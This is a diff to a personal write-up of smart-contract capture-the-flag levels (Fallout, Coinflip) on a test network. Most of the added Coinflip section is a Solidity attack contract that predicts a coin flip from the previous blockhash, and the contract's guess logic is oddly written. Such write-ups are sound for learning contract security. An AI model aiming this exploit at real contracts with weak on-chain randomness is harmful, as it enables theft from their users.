@@ -21,5 +21,42 @@ await contract.Fal1out({value: 1})
 await contract.owner() // after the above command we now see that our address is the owner
 await contract.collectAllocations()
 ```
+## 3. Coinflip
+Ok this was a little bit more difficult from the previous two since now we need to write code. I won't lie either I looked up some hints online to give me some type of idea how to go about this and it was much simpler once i read them. We need to import the CoinFlip contract given to us into a new solidity file so that it can be called at a later point after we submit our guess to the main ```flip()``` function in it.
+
+Below is my contract I wrote and deployed on Rinkeby that ended up working:
+```// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import "./CoinFlip.sol";
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";
+
+contract CoinFlipHack {
+  CoinFlip target = CoinFlip(Instance ID);
+  using SafeMath for uint256;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+
+  function hackFlip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      target.flip(true);
+    } else {
+      target.flip(false);
+    }
+  }
+}
+```
+
 
 
